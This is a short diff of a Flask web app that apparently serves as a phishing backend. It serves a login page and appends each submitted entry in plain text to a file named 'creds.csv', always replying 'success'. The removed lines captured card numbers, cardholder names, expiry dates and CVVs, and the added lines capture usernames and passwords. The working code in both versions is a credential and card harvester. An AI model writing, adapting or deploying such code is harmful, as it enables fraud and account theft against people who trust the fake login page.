@@ -3,22 +3,20 @@ import csv
 
 app = Flask(__name__)
 
-@app.route("/")
-def index():
-    return render_template("/login.html")
+@app.route('/')
+def first():
+    return render_template('/login.html')
 
-@app.route("/login", methods=["POST"])
+@app.route('/login', methods=['POST'])
 def login():
-    card_number = request.json.get("card_number")
-    name = request.json.get("name")
-    expiry = request.json.get("expiry")
-    cvv = request.json.get("cvv")
-    with open("creds.csv", "a+") as f:
+    username = request.json.get('username')
+    password = request.json.get('password')
+    with open('creds.csv', 'a+') as f:
         csv_writer = csv.writer(f)
-        csv_writer.writerow([card_number, name, expiry, cvv])
+        csv_writer.writerow([username, password])
     return jsonify({
-        "status": "success"
+        'status': 'success'
     }), 201
 
-if __name__ == "__main__":
-    app.run(debug = True)
+if __name__ == '__main__':
+    app.run(debug=True)
